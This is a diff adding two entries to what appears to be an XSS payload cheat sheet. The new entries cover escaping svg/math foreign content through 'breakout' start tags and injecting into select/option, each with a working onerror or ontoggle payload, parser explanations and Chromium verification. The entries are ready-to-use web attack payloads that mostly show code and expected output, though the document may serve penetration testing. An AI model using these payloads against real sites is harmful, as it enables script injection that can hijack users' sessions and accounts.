@@ -51,3 +51,20 @@
 - Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is inside a <textarea> tag
 - Case: The <textarea> tag consumes everything until </textarea>. Close the tag inside an attribute and inject an img tag with onerror
 - Output: <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
+
+---
+
+8. XSS Inside `<svg>` / `<math>` Foreign Content (NO closing tag needed)
+- Payload: <img src=x onerror=alert(1)>
+- Condition: Input reflected inside `<svg>` or `<math>` wrapper; angle brackets NOT encoded
+- Case: HTML Standard §13.2.6.5 — a start tag from the breakout list (b, big, blockquote, body, br, center, code, dd, div, dl, dt, em, embed, h1–h6, head, hr, i, img, li, listing, menu, meta, nobr, ol, p, pre, ruby, s, small, span, strong, strike, sub, sup, table, tt, u, ul, var, and font[color|face|size]) pops the parser back to the HTML namespace. `<img src=x onerror=…>` therefore fires INSIDE `<svg>` without `</svg>` at all.
+- Output: <svg><img src=x onerror=alert(1)></svg>
+- Verified: Chromium data: URL — fires `1`
+- Fallback: `<p><details open ontoggle=alert(1)>` (p is also a breakout tag), or classic `</svg><script>…</script>` / `</svg><img …>` closers when breakout tags are filtered.
+
+9. XSS Inside `<select>` — NOT a consuming context (spec correction)
+- Payload: <img src=x onerror=alert(1)>   (works verbatim inside the select)
+- Condition: Input reflected inside `<select>` or even `<option>`; angle brackets NOT encoded
+- Case: The old "in select" insertion mode that dropped non-option markup was REMOVED from the HTML Standard. In current engines markup inside `<select>`/`<option>` is inserted as ordinary DOM children — `<img>`, `<svg>`, `<script>`, `<details>`, `<video>` all fire without any closer. The only select-scoped rules left: `<input>` and nested `<select>` start tags pop the select and land OUTSIDE it (still firing), and `option`/`optgroup` get implied end tags. `</select>` + payload remains a valid fallback but is unnecessary in modern browsers.
+- Verified in Chromium: `<select><img src=x onerror=alert(1)></select>` -> DOM keeps the img child and fires `1`; `<select><option><img …>` fires too.
+
